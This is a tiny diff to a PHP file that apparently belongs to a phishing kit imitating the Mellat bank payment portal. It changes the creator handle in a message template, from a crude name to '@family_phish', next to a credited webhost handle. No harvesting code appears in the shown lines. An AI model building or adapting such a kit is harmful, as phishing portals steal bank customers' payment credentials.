@@ -150,7 +150,7 @@ $Text = "
 📌 Date : $tarikh
 ✨ Portal : Mellat
 ------------- Creator -------------
-🆔 : @fuckingdargah :)
+🆔 : @family_phish :)
 🌐 Webhost : @XTuranli :)
 ";
 $T="000";
